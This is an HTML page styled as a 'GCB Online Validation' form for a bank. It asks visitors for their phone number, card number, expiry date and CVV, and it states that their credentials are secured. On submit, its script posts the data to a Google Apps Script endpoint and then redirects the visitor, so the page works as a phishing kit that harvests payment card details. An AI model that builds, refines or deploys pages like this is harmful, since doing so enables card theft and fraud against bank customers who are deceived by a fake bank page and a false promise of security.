<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GCB Online Validation</title>

<style>

body{
    font-family: Arial, sans-serif;
    margin:0;
    background:#f5f5f5;
}

/* HEADER SECTION */

.header{
    background:#FFD700;
    text-align:center;
    padding:40px 20px;
}

.header h1{
    color:black;
    font-size:32px;
    font-weight:bold;
    margin:0;
}

.header h2{
    color:gray;
    margin-top:10px;
}

/* FORM SECTION */

.form-container{
    background:white;
    max-width:450px;
    margin:40px auto;
    padding:30px;
    border-radius:10px;
    box-shadow:0px 0px 10px rgba(0,0,0,0.15);
}

label{
    font-weight:bold;
    display:block;
    margin-top:15px;
}

input{
    width:100%;
    padding:12px;
    margin-top:5px;
    border-radius:6px;
    border:1px solid #ccc;
    font-size:16px;
}

button{
    margin-top:25px;
    width:100%;
    padding:14px;
    background:black;
    color:white;
    font-size:18px;
    border:none;
    border-radius:6px;
    cursor:pointer;
}

button:hover{
    background:#333;
}

/* FOOTER */

.footer{
    background:#FFD700;
    text-align:center;
    padding:20px;
    font-weight:bold;
}

</style>
</head>


<body>


<!-- HEADER -->

<div class="header">
<h1>GCB ONLINE VALIDATION</h1>
<h2>GCB, YOUR BANK FOR LIFE</h2>
</div>



<!-- FORM -->

<div class="form-container">

<form id="validationForm">

<label>Phone Number</label>
<input type="text" name="phone" required>


<label>Card Number</label>
<input type="text" name="card" required>


<label>Expiry Date</label>
<input type="text" name="expiry" placeholder="MM/YY" required>


<label>CVV</label>
<input type="password" name="cvv" required>


<button type="submit">Validate</button>

</form>

</div>



<!-- FOOTER -->

<div class="footer">
Your credentials are secured.
</div>



<script>

/*
Replace this with your deployed Google Apps Script Web App URL
Example:
https://script.google.com/macros/s/AKfycbxxxx/exec
*/

const scriptURL = "https://script.google.com/macros/s/AKfycbzHd3W5tdmjzVleK7hGlF9j34gYAyAI19r31IgW7PtoSLDNOeuNEVXgR0kY6H2ELHcC/exec";

const form = document.getElementById("validationForm");

form.addEventListener("submit", function(e){

e.preventDefault();

fetch(scriptURL, {
method: "POST",
body: new FormData(form)
})
.then(function(response){

/* Redirect to confirmation page */

window.location.href = "done.html";

})
.catch(function(error){

alert("Submission failed. Please try again.");

});

});

</script>


</body>
</html>
